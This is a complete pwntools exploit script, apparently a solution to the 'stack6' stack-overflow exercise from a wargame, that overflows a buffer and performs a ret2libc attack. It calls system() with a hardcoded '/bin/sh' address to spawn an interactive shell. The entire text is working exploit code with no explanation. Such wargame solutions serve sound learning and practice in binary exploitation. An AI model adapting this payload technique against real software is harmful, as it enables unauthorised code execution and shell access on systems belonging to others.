from pwn import *
proc = process('./stack6')
padding = cyclic(cyclic_find("uaaa"))
system_addr = p32(0xf7e05830)
##ret addr after system()
ret="\x90"*4
bin_sh_addr = p32(0xf7f52352)
payload = padding + system_addr + ret + bin_sh_addr
proc.recvuntil("please: ")
proc.sendline(payload)
proc.recvuntil('\n')
proc.interactive()